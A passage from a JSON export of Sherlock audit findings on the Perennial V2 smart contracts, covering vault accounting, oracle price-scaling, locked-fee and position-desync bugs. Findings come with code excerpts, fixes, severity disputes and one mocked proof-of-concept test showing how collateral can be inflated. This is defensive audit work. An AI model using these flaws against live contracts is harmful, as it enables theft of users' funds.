high or medium?````\n\nI will choose critical though Sherlock doesn't have this level.\n\n**hrishibhat**\n\nResult:\nHigh\nUnique\nAfter considering further points raised by Watson given the frequency of the condition mentioned in the example above. The impact is not just about the loss for the keeper but also keepers not submitting txs and executing orders. This can be looked at as a severe issue overall. Considering this issue a valid high. \n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [ydspa](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/91/#issuecomment-1693709652): accepted",
      "summary": "\nA bug report has been raised for the Perennial Protocol, where keepers will suffer significant losses due to miss compensation for L1 rollup fees. Keepers are required to pay both L2 execution fee and L1 rollup fee when submitting transactions to L2 EVM chains. The current implementation only compensates and incentives keepers based on L2 gas consumption, which means that keepers will suffer significant losses. \n\nThe vulnerability was found by KingNFT and the code snippet can be found at the Github link provided in the report. The impact of this bug is that there will be no enough incentive for keepers to submit oracle price and execute orders, thus the system will not work. \n\nThe severity of this issue was discussed by several parties who suggested that it should be escalated to High or even Critical. It was concluded that the issue is indeed severe, as the users' orders will be held until keepers become profitable, which can lead to financial losses. Furthermore, if the ratio of ````L1GasPrice / L2GasPrice```` and ````block.basefee```` are proper, keepers can set ````1 wei```` orders by themselves to drain funds from the protocol.\n\nThe recommendation for this bug is to compensate L1 rollup fee, with some reference provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/91",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "24303",
      "title": "H-5: Vault.sol: `settle`ing the 0 address will disrupt accounting",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/62 \n\n## Found by \nEmmanuel, WATCHPUG, bin2chen, moneyversed\nDue to the ability of anyone to settle the 0 address, the global assets and global shares will be wrong because lower keeper fees were deducted within the `_settle` function.\n\n## Vulnerability Detail\nWithin `Vault#_loadContext` function, the context.global is the account of the 0 address, while context.local is the account of the address to be updated or settled:\n\n```solidity\nfunction _loadContext(address account) private view returns (Context memory context) {\n    ...\n    context.global = _accounts[address(0)].read();\n    context.local = _accounts[account].read();\n    context.latestCheckpoint = _checkpoints[context.global.latest].read();\n}\n```\n\nIf a user settles the 0 address, the global account will be updated with wrong data.\n\nHere is the \\_settle logic:\n\n```solidity\nfunction _settle(Context memory context) private {\n    // settle global positions\n    while (\n        context.global.current > context.global.latest &&\n        _mappings[context.global.latest + 1].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.global.latest + 1;\n        context.latestCheckpoint = _checkpoints[newLatestId].read();\n        (Fixed6 collateralAtId, UFixed6 feeAtId, UFixed6 keeperAtId) = _collateralAtId(context, newLatestId);\n        context.latestCheckpoint.complete(collateralAtId, feeAtId, keeperAtId);\n        context.global.processGlobal(\n            newLatestId,\n            context.latestCheckpoint,\n            context.latestCheckpoint.deposit,\n            context.latestCheckpoint.redemption\n        );\n        _checkpoints[newLatestId].store(context.latestCheckpoint);\n    }\n\n    // settle local position\n    if (\n        context.local.current > context.local.latest &&\n        _mappings[context.local.current].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.local.current;\n        Checkpoint memory checkpoint = _checkpoints[newLatestId].read();\n        context.local.processLocal(\n            newLatestId,\n            checkpoint,\n            context.local.deposit,\n            context.local.redemption\n        );\n    }\n}\n```\n\nIf settle is called on 0 address, \\_loadContext will give context.global and context.local same data.\nIn the \\_settle logic, after the global account(0 address) is updated with the correct data in the `while` loop(specifically through the processGlobal function),\nthe global account gets reupdated with wrong data within the `if` statement through the processLocal function.\n\nWrong assets and shares will be recorded.\nThe global account's assets and shares should be calculated with toAssetsGlobal and toSharesGlobal respectively, but now, they are calculated with toAssetsLocal and toSharesLocal.\n\ntoAssetsGlobal subtracts the globalKeeperFees from the global deposited assets, while toAssetsLocal subtracts globalKeeperFees/Checkpoint.count fees from the local account's assets.\n\nSo in the case of settling the 0 address, where global account and local account are both 0 address, within the while loop of \\_settle function, depositedAssets-globalKeeperFees is recorded for address(0), but then, in the `if` statement, depositedAssets-(globalAssets/Checkpoint.count) is recorded for address(0)\n\nAnd within the `Vault#_saveContext` function, context.global is saved before context.local, so in this case, context.global(which is 0 address with correct data) is overridden with context.local(which is 0 address with wrong data).\n\n## Impact\nThe global account will be updated with wrong data, that is, global assets and shares will be higher than it should be because lower keeper fees was deducted.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/Vault.sol#L190\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/Vault.sol#L315\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L99\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L119\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\nI believe that the ability to settle the 0 address is intended, so an easy fix is to save local context before saving global context:\nBefore:\n\n```solidity\n    function _saveContext(Context memory context, address account) private {\n        _accounts[address(0)].store(context.global);\n        _accounts[account].store(context.local);\n        _checkpoints[context.currentId].store(context.currentCheckpoint);\n    }\n```\n\nAfter:\n\n```solidity\n    function _saveContext(Context memory context, address account) private {\n        _accounts[account].store(context.local);\n        _accounts[address(0)].store(context.global);\n        _checkpoints[context.currentId].store(context.currentCheckpoint);\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> h\n\n\n\n**arjun-io**\n\nGreat find - we'll fix this\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/86",
      "summary": "\nA bug has been found in the Vault.sol smart contract, which could result in wrong accounting of global assets and global shares. The bug is due to the ability of anyone to settle the 0 address, which results in lower keeper fees being deducted within the `_settle` function. The `_loadContext` function has the global account of the 0 address, while the context.local is the account of the address to be updated or settled. If a user settles the 0 address, the global account will be updated with wrong data. The `_settle` logic contains a `while` loop that updates the global account correctly, however, when the `if` statement is executed, the global account is updated with wrong data. This is because the `toAssetsGlobal` subtracts the globalKeeperFees from the global deposited assets, while `toAssetsLocal` subtracts globalKeeperFees/Checkpoint.count fees from the local account's assets. In the case of settling the 0 address, the global account is updated with wrong data. The impact of this bug is that the global account will be updated with wrong data, resulting in global assets and shares being higher than they should be. The bug was found by Emmanuel, WATCHPUG, bin2chen, and moneyversed. The bug was fixed by arjun-io with the pull request at https://github.com/equilibria-xyz/perennial-v2/pull/86.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/62",
      "tags": [],
      "finders": [
        "WATCHPUG",
        "moneyversed",
        "bin2chen",
        "Emmanuel"
      ]
    },
    {
      "id": "24302",
      "title": "H-4: PythOracle:if price.expo is less than 0, wrong prices will be recorded",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/56 \n\n## Found by \nEmmanuel, minhtrng, panprog\nIn PythOracle#\\_recordPrice function, prices with negative exponents are not handled correctly, leading to a massive deviation in prices.\n\n## Vulnerability Detail\nHere is PythOracle#\\_recordPrice function:\n\n```solidity\n    function _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {\n        _prices[oracleVersion] = Fixed6Lib.from(price.price).mul(\n            Fixed6Lib.from(SafeCast.toInt256(10 ** SafeCast.toUint256(price.expo > 0 ? price.expo : -price.expo)))\n        );\n        _publishTimes[oracleVersion] = price.publishTime;\n    }\n```\n\nIf price is 5e-5 for example, it will be recorded as 5e5\nIf price is 5e-6, it will be recorded as 5e6.\n\nAs we can see, there is a massive deviation in recorded price from actual price whenever price's exponent is negative\n\n## Impact\nWrong prices will be recorded.\nFor example,\nIf priceA is 5e-5, and priceB is 5e-6. But due to the wrong conversion,\n\n- There is a massive change in price(5e5 against 5e-5)\n- we know that priceA is ten times larger than priceB, but priceA will be recorded as ten times smaller than priceB.\n  Unfortunately, current payoff functions may not be able to take care of these discrepancies\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L203\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIn PythOracle.sol, `_prices` mapping should not be ` mapping(uint256 => Fixed6) private _prices;`\nInstead, it should be ` mapping(uint256 => Price) private _prices;`, where Price is a struct that stores the price and expo:\n\n```solidity\nstruct Price{\n    Fixed6 price,\n    int256 expo\n}\n```\n\nThis way, the price exponents will be preserved, and can be used to scale the prices correctly wherever it is used.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> h\n\n\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/53",
      "summary": "\nThis bug report is about an issue found in the PythOracle#_recordPrice function in the perennial-v2 package of the Sherlock Audit project. The issue is that when a price has a negative exponent, it is not handled correctly, leading to a massive deviation in prices. For example, if the price is 5e-5, it will be recorded as 5e5, and if the price is 5e-6, it will be recorded as 5e6. This causes a massive change in price and the current payoff functions may not be able to take care of the discrepancies.\n\nThe bug was found by Emmanuel, minhtrng, and panprog, and was fixed by arjun-io in the pull request https://github.com/equilibria-xyz/perennial-v2/pull/53. The recommended fix for this issue is to change the `_prices` mapping to `mapping(uint256 => Price) private _prices;`, where Price is a struct that stores the price and expo. This way, the price exponents will be preserved, and can be used to scale the prices correctly wherever it is used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/56",
      "tags": [],
      "finders": [
        "panprog",
        "minhtrng",
        "Emmanuel"
      ]
    },
    {
      "id": "24301",
      "title": "H-3: Protocol fee from Market.sol is locked",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/52 \n\n## Found by \n0x73696d616f, Emmanuel, WATCHPUG, bin2chen\n\nThe `MarketFactory#fund` calls the specified market's `Market#claimFee` function.\nThis will send the protocolFee to the MarketFactory contract.\nMarketFactory contract does not max approve any address to spend its tokens, and there is no function that can be used to get the funds out of the contract, so the funds are permanently locked in MarketFactory.\n\n## Vulnerability Detail\nHere is `MarketFactory#fund` function:\n\n```solidity\n  function fund(IMarket market) external {\n        if (!instances(IInstance(address(market)))) revert FactoryNotInstanceError();\n@>      market.claimFee();\n    }\n```\n\nThis is `Market#claimFee` function:\n\n```solidity\n    function claimFee() external {\n        Global memory newGlobal = _global.read();\n\n        if (_claimFee(address(factory()), newGlobal.protocolFee)) newGlobal.protocolFee = UFixed6Lib.ZERO;\n        ...\n    }\n```\n\nThis is the internal `_claimFee` function:\n\n```solidity\n    function _claimFee(address receiver, UFixed6 fee) private returns (bool) {\n        if (msg.sender != receiver) return false;\n\n        token.push(receiver, UFixed18Lib.from(fee));\n        emit FeeClaimed(receiver, fee);\n        return true;\n    }\n```\n\nAs we can see, when `MarketFactory#fund` is called, Market#claimFee gets called which will send the protocolFee to msg.sender(MarketFacttory).\nWhen you check through the MarketFactory contract, there is no place where another address(such as protocol multisig, treasury or an EOA) is approved to spend MarketFactory's funds, and also, there is no function in the contract that can be used to transfer MarketFactory's funds.\nThis causes locking of the protocol fees.\n\n## Impact\nProtocol fees cannot be withdrawn\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/MarketFactory.sol#L89\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L133\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L145-L151\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider adding a `withdraw` function that protocol can use to get the protocolFee out of the contract.\nYou can have the withdraw function transfer the MarketFactory balance to the treasury or something.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> h\n\n**n33k** commented:\n> medium\n\n\n\n**arjun-io**\n\nWe originally wanted to keep the funds in the Factory (for a future upgrade) but it might make sense to instead allow the Factory Owner (Timelock) to claim these funds instead\n\n**Emedudu**\n\nEscalate\n\nI believe this is of HIGH severity because funds are permanently locked\n\n**sherlock-admin2**\n\n > Escalate\n> \n> I believe this is of HIGH severity because funds are permanently locked\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**arjun-io**\n\nFixed https://github.com/equilibria-xyz/perennial-v2/pull/79\n\nre: Escalation - since this contract can be upgraded the funds are not permanently locked\n\n**Emedudu**\n\n>Fixed https://github.com/equilibria-xyz/perennial-v2/pull/79\n\nCan't access the repo to review the fix. It's probably a private repo.\n\n> since this contract can be upgraded the funds are not permanently locked\n\nWhile it's true that the contract can potentially be upgraded to address this issue, it's essential to acknowledge that the current code we audited does, in fact, contain a high severity vulnerability. Otherwise, implying that all upgradeable contracts are free of bugs simply because they can be upgraded to resolve them would be misleading.\n\n**arjun-io**\n\n> Otherwise, implying that all upgradeable contracts are free of bugs simply because they can be upgraded to resolve them would be misleading.\n\nThe distinction here is that \"funds stuck\" are fixable via upgrades, whereas attacks which immediately drain funds or those which cause accounting errors are not after they are executed.\n\n**hrishibhat**\n\nResult:\nHigh\nHas duplicates\nAlthough Sponsor raises a valid point, perhaps Sherlock needs to have a rule with respect to smart contract upgrade-related issues. \nHistorically smart contract upgrades have not weighed on the issue severity decisions but will be considered in future rule updates, however, this issue will be considered as a valid high issue based on historical decisions on similar issues. \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Emedudu](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/52/#issuecomment-1695339981): accepted",
      "summary": "\nThis bug report is about an issue found in the MarketFactory#fund function in the Perennial Protocol. The function calls the Market#claimFee function which sends the protocolFee to the MarketFactory contract. However, the MarketFactory contract does not max approve any address to spend its tokens, and there is no function that can be used to get the funds out of the contract, so the funds are permanently locked in MarketFactory. This means that the protocol fees cannot be withdrawn. The code snippets for the MarketFactory#fund, Market#claimFee, and _claimFee functions can be found in the GitHub link provided in the report. \n\nThe issue was found by 0x73696d616f, Emmanuel, WATCHPUG, bin2chen and was manually reviewed. It was recommended to add a withdraw function that protocol can use to get the protocolFee out of the contract. \n\nThe issue was discussed by sherlock-admin, __141345__, n33k, arjun-io, Emedudu, and hrishibhat during the judging contest. Emedudu escalated the issue to high severity because the funds are permanently locked. Arjun-io fixed the issue by adding a pull request to the GitHub repository, however, Emedudu was not able to access the repo to review the fix. Arjun-io mentioned that the distinction here is that \"funds stuck\" are fixable via upgrades, whereas attacks which immediately drain funds or those which cause accounting errors are not after they are executed. Hrishibhat concluded that the issue should be considered as a valid high issue based on historical decisions on similar issues.\n\nThe issue was successfully resolved and the escalation status was accepted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/52",
      "tags": [],
      "finders": [
        "WATCHPUG",
        "0x73696d616f",
        "bin2chen",
        "Emmanuel"
      ]
    },
    {
      "id": "24300",
      "title": "H-2: Invalid oracle versions can cause desync of global and local positions making protocol lose funds and being unable to pay back all users",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49 \n\n## Found by \npanprog\n\nWhen oracle version is skipped for any reason (marked as invalid), pending positions are invalidated (reset to previous latest position):\n```solidity\n    function _processPositionGlobal(Context memory context, uint256 newPositionId, Position memory newPosition) private {\n        Version memory version = _versions[context.latestPosition.global.timestamp].read();\n        OracleVersion memory oracleVersion = _oracleVersionAtPosition(context, newPosition);\n>        if (!oracleVersion.valid) newPosition.invalidate(context.latestPosition.global);\n...\n    function _processPositionLocal(\n        Context memory context,\n        address account,\n        uint256 newPositionId,\n        Position memory newPosition\n    ) private {\n        Version memory version = _versions[newPosition.timestamp].read();\n>        if (!version.valid) newPosition.invalidate(context.latestPosition.local);\n```\n\nThis invalidation is only temporary, until the next valid oracle version. The problem is that global and local positions can be settled with different next valid oracle version, leading to temporary desync of global and local positions, which in turn leads to incorrect accumulation of protocol values, mostly in profit and loss accumulation, breaking internal accounting: total collateral of all users can increase or decrease due to this while the funds deposited remain the same, possibly triggering a bank run, since the last user to withdraw will be unable to do so, or some users might get collateral reduced when it shouldn't (loss of funds for them).\n\n## Vulnerability Detail\n\nIn more details, if there are 2 pending positions with timestamps different by 2 oracle versions and the first of them has invalid oracle version at its timestamp, then there are 2 different position flows possible depending on the time when the position is settled (update transaction called):\n1. For earlier update the flow is: previous position (oracle v1) -> position 1 (oracle v2) -> position 2 (oracle v3)\n2. For later update position 1 is skipped completely (the fees for the position are also not taken) and the flow is: previous position (oracle v1) -> invalidated position 1 (in the other words: previous position again) (oracle v2) -> position 2 (oracle v3)\n\nWhile the end result (position 2) is the same, it's possible that pending global position is updated earlier (goes the 1st path), while the local position is updated later (goes the 2nd path). For a short time (between oracle versions 2 and 3), the global position will accumulate everything (including profit and loss) using the pending position 1 long/short/maker values, but local position will accumulate everything using the previous position with different values.\n\nConsider the following scenario:\nOracle uses granularity = 100. Initially user B opens position maker = 2 with collateral = 100.\nT=99:  User A opens long = 1 with collateral = 100 (pending position long=1 timestamp=100)\nT=100: Oracle fails to commit this version, thus it becomes invalid\nT=201: At this point oracle version at timestamp 200 is not yet commited, but the new positions are added with the next timestamp = 300:\nUser A closes his long position (update(0,0,0,0)) (pending position: long=1 timestamp=100; long=0 timestamp=300)\nAt this point, current global long position is still 0 (pending the same as user A local pending positions)\n\nT=215: Oracle commits version with timestamp = 200, price = $100\nT=220: User B settles (update(2,0,0,0) - keeping the same position).\nAt this point the latest oracle version is the one at timestamp = 200, so this update triggers update of global pending positions, and current latest global position is now long = 1.0 at timestamp = 200.\nT=315: Oracle commits version with timestamp = 300, price = $90\nafter settlement of both UserA and UserB, we have the following:\n\n1. Global position settlement. It accumulates position [maker = 2.0, long = 1.0] from timestamp = 200 (price=$100) to timestamp = 300 (price=$90). In particular:\nlongPnl = 1*($90-$100) = -$10\nmakerPnl = -longPnl = +$10\n2. User B local position settlement. It accumulates position [maker = 2.0] from timestamp = 200 to timestamp = 300, adding makerPnl ($10) to user B collateral. So user B collateral = $110\n3. User A local position settlement. When accumulating, pending position 1 (long = 1, timestamp = 100) is invalidated to previous position (long = 0) and also fees are set to 0 by invalidation. So user A local accumulates position [long = 0] from timestamp = 0 to timestamp = 300 (next pending position), this doesn't change collateral at all (remains $100). Then the next pending position [long = 0] becomes the latest position (basically position of long=1 was completely ignored as if it has not existed).\n\nResult:\nUser A deposited $100, User B deposited $100 (total $200 deposited)\nafter the scenario above:\nUser A has collateral $110, User B has collateral $100 (total $210 collateral withdrawable)\nHowever, protocol only has $200 deposited. This means that the last user will be unable to withdraw the last $10 since protocol doesn't have it, leading to a user loss of funds.\n\n## Impact\n\nAny time the oracle skips a version (invalid version), it's likely that global and local positions for different users who try to trade during this time will desync, leading to messed up accounting and loss of funds for users or protocol, potentially triggering a bank run with the last user being unable to withdraw all funds.\n\nThe severity of this issue is high, because while invalid versions are normally a rare event, however in the current state of the codebase there is a bug that pyth oracle requests are done using this block timestamp instead of granulated future time (as positions do), which leads to invalid oracle versions almost for all updates (that bug is reported separately). Due to this other bug, the situation described in this issue will arise very often by itself in a normal flow of the user requests, so it's almost 100% that internal accounting for any semi-active market will be broken and total user collateral will deviate away from real deposited funds, meaning the user funds loss.\n\nBut even with that other bug fixed, the invalid oracle version is a normal protocol event and even 1 such event might be enough to break internal market accounting.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```solidity\nit('panprog global-local desync', async () => {\n    const positionMaker = parse6decimal('2.000')\n    const positionLong = parse6decimal('1.000')\n    const collateral = parse6decimal('100')\n\n    const oracleVersion = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, oracleVersion.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)\n\n    const oracleVersion2 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 100,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)\n    oracle.status.returns([oracleVersion2, oracleVersion2.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, positionLong, 0, collateral, false)\n\n    var info = await market.locals(userB.address);\n    console.log(\"collateral deposit maker: \" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(\"collateral deposit long: \" + info.collateral);\n\n    // invalid oracle version\n    const oracleVersion3 = {\n        price: 0,\n        timestamp: TIMESTAMP + 200,\n        valid: false,\n    }\n    oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)\n\n    // next oracle version is valid\n    const oracleVersion4 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 300,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion4.timestamp).returns(oracleVersion4)\n\n    // still returns oracleVersion2, because nothing commited for version 3, and version 4 time has passed but not yet commited\n    oracle.status.returns([oracleVersion2, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // reset to 0\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    // oracleVersion4 commited\n    oracle.status.returns([oracleVersion4, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n\n    const oracleVersion5 = {\n        price: parse6decimal('90'),\n        timestamp: TIMESTAMP + 400,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion5.timestamp).returns(oracleVersion5)\n    oracle.status.returns([oracleVersion5, oracleVersion5.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    console.log(\"collateral maker: \" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(\"collateral long: \" + info.collateral);\n})\n```\n\nConsole output for the code:\n```solidity\ncollateral deposit maker: 100000000\ncollateral deposit long: 100000000\ncollateral maker: 110000028\ncollateral long: 100000000\n```\nMaker has a bit more than $110 in the end, because he also earns funding and interest during the short time when ephemeral long position is active (but user A doesn't pay these fees).\n\n## Code Snippet\n\n`_processPositionGlobal` invalidates position if oracle version is invalid for its timestamp:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L390-L393\n\n`_processPositionLocal` does the same:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L430-L437\n\n`_settle` loops over global and local positions until the latest oracle version timestamp. In this loop each position is invalidated to previous latest if it has invalid oracle timestamp. So if `_settle` is called after the invalid timestamp, previous latest is accumulated for it:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L333-L347\n\nLater in the `_settle`, the latest global and local position are advanced to latestVersion timestamp, the difference from the loop is that since position timestamp is set to valid oracle version, `_processPositionGlobal` and `_processPositionLocal` here will be called with valid oracle and thus position (which is otherwise invalidated in the loop) will be valid and set as the latest position:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L349-L360\n\nThis means that for early timestamps, invalid version positions will become valid in the `sync` part of the `_settle`. But for late timestamps, invalid version position will be skipped completely in the loop before `sync`. This is the core reason of desync between local and global positions.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe issue is that positions with invalid oracle versions are ignored until the first valid oracle version, however the first valid version can be different for global and local positions. One of the solutions I see is to introduce a map of position timestamp -> oracle version to settle, which will be filled by global position processing. Local position processing will follow the same path as global using this map, which should eliminate possibility of different paths for global and local positions.\n\nIt might seem that the issue can only happen with exactly 1 oracle version between invalid and valid positions. However, it's also possible that some non-requested oracle versions are commited (at some random timestamps between normal oracle versions) and global position will go via the route like t100[pos0]->t125[pos1]->t144[pos1]->t200[pos2] while local one will go t100[pos0]->t200[pos2] OR it can also go straight to t300 instead of t200 etc. So the exact route can be anything, and local oracle will have to follow it, that's why I suggest a path map.\n\nThere might be some other solutions possible.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**panprog**\n\nEscalate\n\nThis should be high, because:\n1. When the situation described in the issue happens, it causes serious internal accounting issue causing loss of funds by users and possibly causing bank run and then loss of funds by the last users.\n2. The condition for this to happen is invalid oracle version, which in the current state of the code will happen regularly (see #42)\n3. For the situation described to happen it's enough for 1 user to request to open position, oracle to be invalid for that position timestamp, and then the user to request any modification to this position (increase or decrease), then another user to do any action after the next oracle is commited. That's it, internal accounting is broken.\n4. The stated flow of events can happen by itself very regularly in any semi-active market, leading to worse and worse accounting broking up.\n5. **OR** malicious user can try to abuse this scenario to profit off it or just to break the protocol. Doing this is mostly free (except for some keeper fees). In such case the protocol will be broken very quickly.\n\nI don't know why it's judged medium, but this issue is very likely to happen and will cause a lot of damage to the market, thus it should be high.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This should be high, because:\n> 1. When the situation described in the issue happens, it causes serious internal accounting issue causing loss of funds by users and possibly causing bank run and then loss of funds by the last users.\n> 2. The condition for this to happen is invalid oracle version, which in the current state of the code will happen regularly (see #42)\n> 3. For the situation described to happen it's enough for 1 user to request to open position, oracle to be invalid for that position timestamp, and then the user to request any modification to this position (increase or decrease), then another user to do any action after the next oracle is commited. That's it, internal accounting is broken.\n> 4. The stated flow of events can happen by itself very regularly in any semi-active market, leading to worse and worse accounting broking up.\n> 5. **OR** malicious user can try to abuse this scenario to profit off it or just to break the protocol. Doing this is mostly free (except for some keeper fees). In such case the protocol will be broken very quickly.\n> \n> I don't know why it's judged medium, but this issue is very likely to happen and will cause a lot of damage to the market, thus it should be high.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Emedudu**\n\nEscalate\n\n>When oracle version is skipped for any reason (marked as invalid), pending positions are invalidated (reset to previous latest position):\n\nThis is not HIGH because there is a limitation: \"When oracle version is skipped for any reason\"\nThis is a VERY unlikely event.\nSo by Sherlock rules, it is a [MEDIUM](https://docs.sherlock.xyz/audits/judging/judging):\n\"Medium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\"\n\n**panprog**\n\n> This is not HIGH because there is a limitation: \"When oracle version is skipped for any reason\"\n> This is a VERY unlikely event.\n\nWhile it is supposed to be a rare event, in the current state of the code, this is a **VERY LIKELY** event, see #42 \nIt should be judged based on the current code, not on assumptions of how it will work in the future.\n\n**Emedudu**\n\nSkipping of oracle versions is an unlikely event.\nThis was stated under the impact section of the issue:\n\"The severity of this issue is high, `because while invalid versions are normally a rare event`, however in the current state of the codebase there is a bug that pyth oracle requests are done using this block timestamp instead of granulated future time (as positions do), which leads to invalid oracle versions almost for all updates (that bug is reported separately).\"\n\nThis makes this issue to fall under MEDIUM severity according to Sherlock's classification rules.\n\n**Minh-Trng**\n\n> It should be judged based on the current code, not on assumptions of how it will work in the future.\n\nit should be treated like different submissions describing different impacts with the same root cause:\ndoes fixing that one root cause mitigate all described impacts? then all of them are considered duplicates.\n\nnow, clearly your submission is not a duplicate, but it builds on that same root cause. if this root cause were fixed, your impact would still hold, but with a much lower likelihood\n\n**panprog**\n\n> now, clearly your submission is not a duplicate, but it builds on that same root cause. if this root cause were fixed, your impact would still hold, but with a much lower likelihood\n\nYes, I chain 2 issues to demonstrate high impact. In this case both issues should be high. We can't start predicting future \"what happens if that one is fixed...\" The way it is now - existance of either issue creates a high impact for the protocol, and each issue is a separate one.\nI disagree that the issue should be \"isolated\" and impact considered as if the other issues are fixed.\nSherlock has the following judging rule:\n> Future issues: Issues that result out of a future integration/implementation that was not intended (mentioned in the docs/README) or because of a future change in the code (as a fix to another issue) are not valid issues.\n\nWhile it doesn't provide the same clear rule for the opposite, I believe it's a logical continuation of that rule to that impact shouldn't be decreased because of a future change in the code (as a fix to another issue).\n\n**sherlock-admin2**\n\n > Escalate\n> \n> >When oracle version is skipped for any reason (marked as invalid), pending positions are invalidated (reset to previous latest position):\n> \n> This is not HIGH because there is a limitation: \"When oracle version is skipped for any reason\"\n> This is a VERY unlikely event.\n> So by Sherlock rules, it is a [MEDIUM](https://docs.sherlock.xyz/audits/judging/judging):\n> \"Medium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\"\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: 